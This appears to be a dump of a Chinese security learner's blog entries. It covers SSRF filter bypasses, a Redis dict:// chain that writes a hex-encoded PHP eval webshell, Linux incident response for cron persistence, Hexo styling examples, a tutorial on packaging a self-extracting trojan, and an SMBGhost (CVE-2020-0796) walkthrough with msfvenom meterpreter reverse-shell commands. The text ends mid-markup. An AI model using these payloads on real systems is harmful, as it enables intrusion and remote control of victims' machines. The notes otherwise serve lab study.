href="http://114.taobao.com/">http://114.taobao.com/</a><br>  <a href="http://wifi.aliyun.com/">http://wifi.aliyun.com/</a><br>  <a href="http://imis.qq.com/">http://imis.qq.com/</a><br>  <a href="http://localhost.sec.qq.com/">http://localhost.sec.qq.com/</a><br>  <a href="http://ecd.tencent.com/">http://ecd.tencent.com/</a></li></ul></li><li><p><strong>使用 URL 编码或大小写变化来混淆被阻止的字符串</strong>，<strong>或者使用@ <code>a.com@10.10.10.10</code> <code>a.com:b@10.10.10.10</code>。</strong></p></li><li><p><strong>提供一个您控制的 URL，该 URL 重定向到目标 URL</strong>。尝试使用不同的重定向代码，以及目标 URL 的不同协议。例如，在重定向期间将 URL 从 <code>http:</code> 切换到 <code>https:</code> 已被证明可以绕过一些反 SSRF 过滤器。</p></li><li><p><strong>- 短网址跳转 - “短网址”响应(301 永久重定向)到内网地址 <code>http://10.10.116.11 =&gt; http://t.cn/RwbLKDx</code></strong></p><ul><li>工具网址：<a href="https://my5353.com/">短网址生成器 | LinkShortener (my5353.com)</a><img src="https://i.imgur.com/y9VL5Nh.png"></li></ul></li><li><p>DNS重绑定</p><ol><li><a href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us DNS 重新绑定服务 — rbndr.us dns rebinding service (cmpxchg8b.com)</a> <img src="https://i.imgur.com/ml7PVRm.png"></li></ol></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/26698826/1707585889614-0db59115-3bbc-44b3-8938-d867e0888105.png?x-oss-process=image/format,webp/resize,w_847,limit_0/watermark,type_d3F5LW1pY3JvaGVp,size_24,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/resize,w_847,limit_0"></p><h1 id="SSRF-redis"><a href="#SSRF-redis" class="headerlink" title="SSRF+redis"></a>SSRF+redis</h1><p>ssrf可以通过http和dict协议进行端口扫描</p><p>第一个：手写</p><blockquote><p>[!NOTE] 手写redis的webshell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dict://localhost:6378/flushall</span><br><span class="line">dict://localhost:6378/config:<span class="built_in">set</span>:<span class="built_in">dir</span>:/var/www/html/app1</span><br><span class="line">dict://localhost:6378/config:<span class="built_in">set</span>:dbfilename:hh.php</span><br><span class="line">dict://localhost:6378/set:1:<span class="string">&quot;\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x77\x5d\x29\x3b\x3f\x3e&quot;</span></span><br><span class="line">dict://localhost:6378/save</span><br><span class="line"></span><br><span class="line">webshell密码w</span><br></pre></td></tr></table></figure></blockquote><p>第二个：gopaer协议url</p><p>ssrf可以通过http和dict协议进行端口扫描  </p><p>后续参照：</p><p><a href="https://xz.aliyun.com/t/15251?u_atoken=691d34d01e071a9852e9493cb8427982&u_asig=0a472f8c17279634543966257e004a">从靶场中学习OAuth - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/15249">XSS之Flash弹窗钓鱼和文件上传getshell各种姿势 - 先知社区 (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应</title>
      <link href="/2024/10/03/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2024/10/03/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<p>视频网址：<a href="https://meeting.tencent.com/crw/2VvoqeQ2e8">录制文件 (tencent.com)</a></p><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><ul><li>写定时任务：<code>crontab -e</code> 查看当前用户的计划任务</li><li>写启动项：<code>cat /etc/rc.local</code> 查看启动项, 不同系统的 <code>rc.local</code> 位置不一定相同</li><li>上传木马</li><li>创建用户</li><li>服务（xx）</li></ul><span id="more"></span><h1 id="以计划任务为示例讲解应急响应"><a href="#以计划任务为示例讲解应急响应" class="headerlink" title="以计划任务为示例讲解应急响应"></a>以计划任务为示例讲解应急响应</h1><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><code>crontab -e</code> 查看当前用户的计划任务，可以看到显示的指令内容为每分钟执行一次 <code>/root/run.sh</code><br><img src="https://i.imgur.com/7Vysf73.gif" alt="动画2.gif"></p><p>使用 <code>cat</code> 命令查看所执行的指令文件<br><img src="https://i.imgur.com/H3yo5VX.gif" alt="动画3.gif"><br>攻击机获取到 shell<br><img src="https://i.imgur.com/93rs17G.png"></p><h2 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h2><p>攻击机：192.168.187.132<br>受害机：192.168.187.141<br><img src="https://i.imgur.com/jIfHFsH.png"></p><h2 id="应急响应步骤"><a href="#应急响应步骤" class="headerlink" title="应急响应步骤"></a>应急响应步骤</h2><h3 id="1-清除木马文件"><a href="#1-清除木马文件" class="headerlink" title="1.清除木马文件"></a>1.清除木马文件</h3><p>判断标准：运行木马文件后会有一个外联进程<br>判断方法：<br>    <code>netstat -anltp</code> 来查看外联 ip, 最后的 p 是 pid 的意思，这里的外联 ip 的 pid 为 3073 确认可疑文件<br><img src="https://i.imgur.com/IscQ9zi.gif" alt="linux-1.gif"><br>    <code>ls -all /proc/xxx</code> 定位木马文件<code>![linux-2.gif](https://i.imgur.com/ZKIgWLf.gif)    </code>find &#x2F; -name *ceshi.eif&#96;<br><img src="https://i.imgur.com/1jjVPOW.gif" alt="linux-3.gif"></p><p>杀死进程，<br><img src="https://i.imgur.com/FG2Phyf.gif" alt="动画.gif"></p><p>但由于计划任务每分钟会执行一次，所以没有什么效果，需要删除木马文件<br>备份木马样本为 <code>.bak</code> 文件<br><img src="https://i.imgur.com/g9wEiwI.gif" alt="动画4.gif"><br>删除木马文件，这里因为文件在桌面所以直接拖拽到回收站，命令行可以使用 <code>rm -rf 文件名</code> 来删除<br><img src="https://i.imgur.com/HO6oDWS.gif" alt="动画5.gif"></p><p>清理木马痕迹，删除残余文件以及计划任务<br><code>cat</code> 定时任务中的文件查看内容，<code>rm -rf</code> 删除文件命令<br><code>crontab -e</code> 进入定时任务后 i 进入编辑模式然后删除<br><img src="https://i.imgur.com/C4Lp1ky.gif" alt="动画6.gif"></p><h1 id="检查启动项"><a href="#检查启动项" class="headerlink" title="检查启动项"></a>检查启动项</h1><p><code>cat /etc/rc.local</code> 无异常<br><img src="https://i.imgur.com/tUrRwWE.gif" alt="动画8.gif"><br>未发现异常指令<br><code>ls -all /etc/init.d/</code>  无异常<br><img src="https://i.imgur.com/qALy4JV.gif" alt="动画10.gif"></p><p><code>ls -all /etc/rc.d/rc*.d</code>  查看所有计划任务，没有异常<br><img src="https://i.imgur.com/ftWRKyX.gif" alt="动画11.gif"></p><h1 id="检查是否创建用户"><a href="#检查是否创建用户" class="headerlink" title="检查是否创建用户"></a>检查是否创建用户</h1><p><code>cat etc/passwd</code><br><img src="https://i.imgur.com/wIcYzNw.gif" alt="动画12.gif"><br>所有 id 为 1000 以上的都是用户自己创建的<br><img src="https://i.imgur.com/oJpJWaR.png"><br>也可以尝试 <code>cat /etc/shadow</code><br><img src="https://i.imgur.com/SJJSaCX.gif" alt="动画13.gif"><br>这里能看到 admin 用户的账号密码，密码是 md 5 加密<br>如果觉得用户可疑，可以使用<br><code>ls -all /home/admin/.bash_logout</code> 查看用户创建时间<br><img src="https://i.imgur.com/dnLlf7g.gif" alt="动画14.gif"></p><p>或者 <code>history</code> 查看用户执行过的操作<br>如果攻击者使用 <code>history -c</code> 删除了命令，则需要使用<br><code>cat /root/.bash_history</code><br><code>cat /home/admin/.bash_history</code></p><h1 id="查看上传文件"><a href="#查看上传文件" class="headerlink" title="查看上传文件"></a>查看上传文件</h1><p><code>ls -all /tmp/</code> 查看 tmp 目录中的文件<br><img src="https://i.imgur.com/CmnWpDX.gif" alt="动画15.gif"></p><p><code>find / -ctime 1 -name &quot;*&quot;</code> 查看 <code>/</code> 根目录下 24 小时内所有变化文件<br>检查可疑的 <code>.sh</code>, <code>.exe</code>, <code>.elf</code> 文件，最后检查二十四小时内的变化文件<br><img src="https://i.imgur.com/D67WLTs.gif" alt="动画16.gif"></p><p><code>cat /var/spool/cron/root</code> 查看定时任务</p><h1 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h1><p><code>w</code><br><code>who</code><br><code>lastlog</code>  查看最后用户登录<br><code>top</code><br><img src="https://i.imgur.com/niJ9uPk.gif" alt="动画17.gif"></p><p>Ssh 的日志<br><a href="https://meeting.tencent.com/crw/2VvoqeQ296">录制文件 (tencent.com)</a> –1:40:41<br><code>cat /var/log/secure</code> 查看 ssh 登录爆破的命令<br><img src="https://i.imgur.com/RNsvPOF.png"><br>连接成功的记录<br><code>cat /var/log/secure|grep &quot;Accepted password&quot;</code> 来查看登录成功的 ip</p><p>Phpstudy 的日志<br><img src="https://i.imgur.com/a8rni5C.png"></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>参考样式</title>
      <link href="/2024/10/03/Hexo%E4%B8%BB%E9%A2%98%E5%8F%82%E8%80%83%E6%A0%B7%E5%BC%8F/"/>
      <url>/2024/10/03/Hexo%E4%B8%BB%E9%A2%98%E5%8F%82%E8%80%83%E6%A0%B7%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>因为看着头疼所以简单整理了一下Hexo主题的样式，不过似乎用处不是很大</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h1 id="引用样式"><a href="#引用样式" class="headerlink" title="引用样式"></a>引用样式</h1><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTML方式: 直接在 Markdown 文件中编写 HTML 来调用 --&gt;</span><br><span class="line">&lt;!-- 其中 class=&quot;blockquote-center&quot; 是必须的 --&gt;</span><br><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;样式一&lt;/blockquote&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 标签 方式，要求版本在0.4.5或以上 --&gt;  </span><br><span class="line">&#123;% centerquote %&#125;样式二&#123;% endcenterquote %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- 标签别名 --&gt;</span><br><span class="line">&#123;% cq %&#125; 样式三&#123;% endcq %&#125;</span><br></pre></td></tr></table></figure><!-- HTML方式: 直接在 Markdown 文件中编写 HTML 来调用 --><!-- 其中 class="blockquote-center" 是必须的 --><blockquote class="blockquote-center">样式一</blockquote><!-- 标签 方式，要求版本在0.4.5或以上 --><blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>样式二</p>            <i class="fa fa-quote-right"></i>          </blockquote><!-- 标签别名 --><blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>样式三</p>            <i class="fa fa-quote-right"></i>          </blockquote><h2 id="提示框样式"><a href="#提示框样式" class="headerlink" title="提示框样式"></a>提示框样式</h2><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><div class="note class_name">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note default %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note default">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note primary %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><div class="note primary">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note success %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note success">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note info %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note info">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note warning %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note warning">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note danger %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示:</p><div class="note danger">            <p>Content (md partial supported) </p>          </div><h2 id="块引用"><a href="#块引用" class="headerlink" title="块引用"></a>块引用</h2><p>非常适合在您的帖子中添加引文，其中包含可选的作者、来源和标题信息。</p><p><strong>Alias:</strong> quote </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote [author[, source]] [link] [source_link_title] %&#125;  </span><br><span class="line">content  </span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p><strong>没有参数，普通的块引用</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote %&#125;</span><br><span class="line">信天地广阔无奇不有，四海八方终有归处。信万物有宗法，善恶皆有报。信有百鬼横行就必有英雄出世，所有的苦难故事都有被改变的终局。</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><blockquote><p>信天地广阔无奇不有，四海八方终有归处。信万物有宗法，善恶皆有报。信有百鬼横行就必有英雄出世，所有的苦难故事都有被改变的终局。 </p></blockquote><p><strong>引用自书籍</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote David 渡鸦 %&#125;</span><br><span class="line">白日已死，长夜不眠，唯一的月亮还生了锈</span><br><span class="line">那就把他点燃，让他照亮</span><br><span class="line">我在辛迪加的土地上，见证绝望，也见证希望</span><br><span class="line">沉醉黑暗，也追寻光明</span><br><span class="line">撰写诗篇，也化为诗篇</span><br><span class="line">为敬那些</span><br><span class="line">锈烬中复燃的火🔥</span><br><span class="line">朽林里咆哮的风🌪️</span><br><span class="line">敬暴雨中振翅的燕🐦</span><br><span class="line">淤泥里怒放的花🌹</span><br><span class="line">敬理想，敬希望，敬未来！</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><blockquote><p>白日已死，长夜不眠，唯一的月亮还生了锈<br>那就把他点燃，让他照亮<br>我在辛迪加的土地上，见证绝望，也见证希望<br>沉醉黑暗，也追寻光明<br>撰写诗篇，也化为诗篇<br>为敬那些<br>锈烬中复燃的火🔥<br>朽林里咆哮的风🌪️<br>敬暴雨中振翅的燕🐦<br>淤泥里怒放的花🌹<br>敬理想，敬希望，敬未来！</p><footer><strong>渡鸦，诗篇</strong></footer></blockquote><p><strong>引自推特</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote @DevDocs https://twitter.com/devdocs/status/356095192085962752 %&#125;  </span><br><span class="line">新增功能：DevDocs 现在提供语法高亮功能。 http://devdocs.io  </span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><blockquote><p>新增功能：DevDocs 现在提供语法高亮功能。<a href="http://devdocs.io/">http://devdocs.io</a></p><footer><strong>@DevDocs</strong><cite><a href="https://twitter.com/devdocs/status/356095192085962752">twitter.com/devdocs/status/356095192085962752</a></cite></footer></blockquote><p><strong>引自网络上的一篇文章</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote Seth Godin http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html 欢迎来到 Island Marketing %&#125;  </span><br><span class="line">每一次互动都是珍贵的，也是令人愉悦的机会。 </span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><blockquote><p>每一次互动都是珍贵的，也是令人愉悦的机会。 </p><footer><strong>Seth Godin</strong><cite><a href="http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html">欢迎来到 Island Marketing</a></cite></footer></blockquote><h2 id="行"><a href="#行" class="headerlink" title="行"></a>行</h2><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;  </span><br><span class="line">content  </span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure><p>显示</p>  content  <h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p><strong>普通代码块</strong>：</p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock %&#125;  </span><br><span class="line">alert(&#x27;Hello World!&#x27;);  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">alert(&#x27;Hello World!&#x27;);  </span><br></pre></td></tr></table></figure><p><strong>语言指定</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock lang:objc %&#125;  </span><br><span class="line">[rectangle setX: 10 y: 10 width: 20 height: 20];  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">[rectangle setX: <span class="number">10</span> y: <span class="number">10</span> width: <span class="number">20</span> height: <span class="number">20</span>];  </span><br></pre></td></tr></table></figure><p><strong>代码块添加标题</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock Array.map %&#125;  </span><br><span class="line">array.map(callback[, thisArg])  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><figure class="highlight plaintext"><figcaption><span>Array.map</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">array.map(callback[, thisArg])  </span><br></pre></td></tr></table></figure><p><strong>添加标题和 URL</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock _.compact http://underscorejs.org/#compact Underscore.js %&#125;  </span><br><span class="line">_.compact([0, 1, false, 2, &#x27;&#x27;, 3]);  </span><br><span class="line">=&gt; [1, 2, 3]  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示:</p><figure class="highlight plaintext"><figcaption><span>_.compact</span><a href="http://underscorejs.org/#compact">Underscore.js</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">_.compact([0, 1, false, 2, &#x27;&#x27;, 3]);  </span><br><span class="line">=&gt; [1, 2, 3]  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 范式阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/10/03/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%953/"/>
      <url>/2024/10/03/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%953/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="title-图片测试3"><a href="#title-图片测试3" class="headerlink" title="title:图片测试3"></a>title:图片测试3</h2><p>自解压木马</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol><li>压缩包文件夹准备，放入木马（触发程序）</li></ol><p><img src="/../img/Pasted%20image%2020240711111126.png"></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><ol start="2"><li>使用rar制作自解压压缩文件（此处的最后一个路径斜杠打错了，嗯，，正确应该是<code>\</code>)</li></ol><p><img src="/../img/Pasted%20image%2020240711112644.png"><br><img src="/../img/Pasted%20image%2020240711111305.png"></p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><ol start="3"><li>模式选择全隐藏</li></ol><p><img src="/../img/Pasted%20image%2020240711111350.png"><br><img src="/../img/Pasted%20image%2020240711111402.png"></p><h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><p>4.生成自解压木马测试.exe</p><p><img src="/../img/Pasted%20image%2020240711111650.png"></p><h2 id="-4"><a href="#-4" class="headerlink" title=""></a></h2><ol start="5"><li>启动自解压木马，静默解压到自解压位置并自行触发安装程序<br><img src="/../img/Pasted%20image%2020240711112051.png"><br><img src="/../img/Pasted%20image%2020240711112015.png"></li></ol><h2 id="-5"><a href="#-5" class="headerlink" title=""></a></h2><ol start="6"><li>后记</li></ol><p>嗯。。。这算是配合那个啥子flash弹窗触发的一个自捆绑木马，还挺离谱的。。。，对以前的全家桶下载包有了些许新奇的认知</p><blockquote><p>[!NOTE] Title<br>Contents</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>永恒之黑漏洞参考文档</title>
      <link href="/2024/10/03/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/"/>
      <url>/2024/10/03/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>POC(蓝屏):漏洞证明</p><blockquote><p>下载<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a><br>使用<br><code>pip install ntlm_auth</code></p></blockquote><p> .&#x2F;CVE-2020-0796.py  192.168.30.134</p><span id="more"></span><p> EXP(RCE)：漏洞利用</p><p>下载<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a><br> 接下来使用kali作为攻击机</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.223.128  LPORT=5555 -b &#x27;\x00&#x27; -i 5 -f python &gt; exploit</span><br></pre></td></tr></table></figure><p> 使用vim</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim exploit                     </span><br><span class="line">:%s/buf/USER_PAYLOAD             </span><br><span class="line">:wq!  </span><br></pre></td></tr></table></figure><p> 去文件夹将exploit内容替换到exploit.py</p><p> 参考<a href="https://blog.csdn.net/weixin_63610715/article/details/133847253">https://blog.csdn.net/weixin_63610715/article/details/133847253</a></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set lhost 192.168.20.128</span><br><span class="line">set lport 5555</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">python exploit.py -ip 192.168.20.128（靶机ip)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><h2 id="一、复现环境"><a href="#一、复现环境" class="headerlink" title="一、复现环境"></a>一、复现环境</h2><p>靶机：windows10 1903 x64ip：192.168.1.6（关闭防火墙）<br>下载地址：<a href="https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&appType=PC&videobtindex=-1&storid=c39vhtrekug5&share_from=dlpage_share_link">https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&amp;appType=PC&amp;videobtindex=-1&amp;storid=c39vhtrekug5&amp;share_from=dlpage_share_link</a><br>攻击机：kali2019ip：192.168.1.10</p><p><img src="https://i.imgur.com/EILRkWU.png"></p><p><img src="https://i.imgur.com/UhnbLnD.png"></p><h2 id="二、检测工具："><a href="#二、检测工具：" class="headerlink" title="二、检测工具："></a>二、检测工具：</h2><h3 id="1-在靶机里下载检测工具：http-dl-qianxin-com-skylar6-CVE-2020-0796-Scanner-zip"><a href="#1-在靶机里下载检测工具：http-dl-qianxin-com-skylar6-CVE-2020-0796-Scanner-zip" class="headerlink" title="1.在靶机里下载检测工具：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/"></a>1.在靶机里下载检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/</a></h3><h3 id="2-运行工具，检测到漏洞风险"><a href="#2-运行工具，检测到漏洞风险" class="headerlink" title="2.运行工具，检测到漏洞风险"></a>2.运行工具，检测到漏洞风险</h3><p><img src="https://i.imgur.com/lHXZ6BO.png"></p><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>POC下载：</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li>在kali中利用MSF生成木马：</li></ol><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.129 LPORT=5555 -b &#39;\x00&#39; -i 1 -f python &gt; exploit</code></p><p>&#x2F;&#x2F; -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp 设置payload为windows64位meterpreter控制台下的反向连接<br>&#x2F;&#x2F; LPORT&#x3D;6666 设置开发端口为6666<br>&#x2F;&#x2F; -b ‘\x00’ 设置在生成的程序中避免出现’\x00’<br>&#x2F;&#x2F; -i 1 设置编码次数为一次<br>&#x2F;&#x2F; -f python 设置生成python格式文件</p><h3 id="2-用生成的shellcode将POC文件里exploit-py中的一部分替换掉，直接复制粘贴，将buf替换成USER-PAYLOAD保存"><a href="#2-用生成的shellcode将POC文件里exploit-py中的一部分替换掉，直接复制粘贴，将buf替换成USER-PAYLOAD保存" class="headerlink" title="2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存"></a>2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存</h3><p><img src="https://i.imgur.com/oTLY6a1.png"></p><h3 id="3-kali开启监听"><a href="#3-kali开启监听" class="headerlink" title="3. kali开启监听"></a>3. kali开启监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 